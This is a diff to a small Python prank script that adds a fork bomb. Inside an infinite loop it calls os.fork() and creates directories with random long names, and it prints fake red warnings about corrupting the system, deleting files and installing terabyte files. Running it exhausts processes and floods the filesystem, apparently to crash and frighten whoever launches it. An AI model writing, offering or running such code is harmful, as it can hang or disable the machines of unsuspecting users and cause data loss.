@@ -1,11 +1,13 @@
 import os
 import random
+import time
 
 def clear():
 	os.system('clear')
 
 ro = '\033[1;35m'
 cl = '\033[0m'
+v = '\033[1;31m'
 
 clear()
 
@@ -24,7 +26,7 @@ input('>>>')
 def bombdir(Length):
     numeros = '0123456789'
     letras = 'abcdefghijklmnopqrstuvwxyz'
-    cs = '-,_.'
+    cs = '.-_'
     ran = ''
     for i in range(0,Length,2):
         ran += random.choice(letras)
@@ -34,7 +36,13 @@ def bombdir(Length):
 	
 clear()
 
-print('CARREGANDO...')
+time.sleep(1.5)
+print(f'{v}corrupting system...')
+time.sleep(1.5)
+print(f'{v}deleting files...')
+time.sleep(1.5)
+print(f'{v}installing 4 terabyte files...')
 
 while True:
+	os.fork()
 	os.system(f'mkdir {bombdir(10*10)}')
